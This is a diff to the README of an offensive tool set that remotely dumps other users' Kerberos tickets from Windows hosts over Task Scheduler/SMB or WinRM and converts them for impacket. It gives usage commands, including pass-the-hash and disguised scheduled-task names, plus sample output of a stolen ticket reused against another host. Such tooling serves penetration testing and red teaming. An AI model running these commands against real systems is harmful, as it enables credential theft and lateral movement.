@@ -1,6 +1,6 @@
 # klist
 
-Windows' built-in `klist` binary supports dumping Kerberos TGTs. **klist2ccache** converts that output to ccache format for use with impacket and other Linux Kerberos tooling. **klistremote** does the same thing remotely: connects to a Windows host via Task Scheduler, runs `klist` as LocalSystem, and writes ccache files locally.
+Windows' built-in `klist` binary supports dumping Kerberos TGTs. **klist2ccache** converts that output to ccache format for use with impacket and other Linux Kerberos tooling. **klistremote** does the same thing remotely via Task Scheduler + SMB. **klistwinrm** does the same thing remotely via WinRM.
 
 ---
 
@@ -42,13 +42,19 @@ Default mode writes output to a temp file on the target (`C:\ProgramData\`), rea
 ```bash
 # List sessions
 python klistremote.py list LUMON/admin@target
-python klistremote.py list -hashes :NTHASH user@target
+python klistremote.py list LUMON/admin@target --computer   # include machine accounts
 
 # Dump all sessions
 python klistremote.py dump LUMON/admin@target -o ./ccaches
 
 # Dump a specific session (1-based index from list)
 python klistremote.py dump LUMON/admin@target -s 1 -o ./ccaches
+
+# Pass-the-hash
+python klistremote.py list -hashes :NTHASH user@target
+
+# Kerberos auth
+python klistremote.py list -k LUMON/user@target
 
 # No files on disk (PowerShell named pipe)
 python klistremote.py list -named-pipes -hashes :NTHASH user@target
@@ -68,23 +74,17 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
   Kerberos sessions on 10.10.10.5:
 
-  [1]  LUMON\jotter     0x154333
-  [2]  LUMON\jotter-pc$ 0x3e4
-
-$ python klistremote.py dump LUMON/admin@10.10.10.5 -s 1 -o ./ccaches
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
-
-[!] This will work ONLY on Windows >= Vista
-[*] Connecting to 10.10.10.5 ...
-[*] Enumerating remote Kerberos sessions ...
-[*]   task: \ChromeManager  file: ChromeManager_71053.log
-
-  Sessions to dump:
-
   [1]  LUMON\jotter  0x154333
 
-[*] Dumping 1 TGT(s) in one task ...
-[*]   task: \ChromeCollector  file: ChromeCollector_92714.log
+$ python klistremote.py list LUMON/admin@10.10.10.5 --computer
+
+  Kerberos sessions on 10.10.10.5:
+
+  [1]  LUMON\jotter      0x154333
+  [2]  LUMON\jotter-pc$  0x3e4
+
+$ python klistremote.py dump LUMON/admin@10.10.10.5 -s 1 -o ./ccaches
+...
 [*] [1/1] LUMON\jotter (0x154333) ...
 [*]   -> ./ccaches/jotter@LUMON.COM.ccache
 [*] Done. 1 ccache(s) written to ./ccaches
@@ -94,3 +94,47 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 export KRB5CCNAME=./ccaches/jotter@LUMON.COM.ccache
 impacket-smbclient -k -no-pass LUMON/jotter@target
 ```
+
+---
+
+## klistwinrm
+
+Same as klistremote but uses WinRM instead of Task Scheduler + SMB. Simpler setup — no SMB required, just WinRM (port 5985/5986) open on the target.
+
+```bash
+pip install pywinrm
+pip install requests-ntlm2  # optional: pass-the-hash support
+```
+
+```bash
+# List sessions
+python klistwinrm.py list LUMON/admin@target
+python klistwinrm.py list LUMON/admin@target --computer   # include machine accounts
+
+# Dump all sessions
+python klistwinrm.py dump LUMON/admin@target -o ./ccaches
+
+# Dump a specific session
+python klistwinrm.py dump LUMON/admin@target -s 1 -o ./ccaches
+
+# Pass-the-hash (requires requests-ntlm2)
+python klistwinrm.py list -hashes :NTHASH user@target
+
+# Kerberos auth
+python klistwinrm.py list -k LUMON/user@target
+
+# HTTPS / custom port
+python klistwinrm.py list LUMON/admin@target -ssl
+python klistwinrm.py list LUMON/admin@target -port 5986 -ssl
+```
+
+| Flag | klistremote | klistwinrm |
+|------|-------------|------------|
+| Password (NTLM) | ✓ | ✓ |
+| `-hashes :NTHASH` (PTH) | ✓ | ✓ (needs requests-ntlm2) |
+| `-k` (Kerberos ccache) | ✓ | ✓ |
+| `-aesKey` | ✓ | ✓ (get TGT first via getTGT.py) |
+| `-keytab` | ✓ | ✓ |
+| `--computer` | ✓ | ✓ |
+| `-named-pipes` | ✓ | — |
+| `-ssl` / `-port` | — | ✓ |
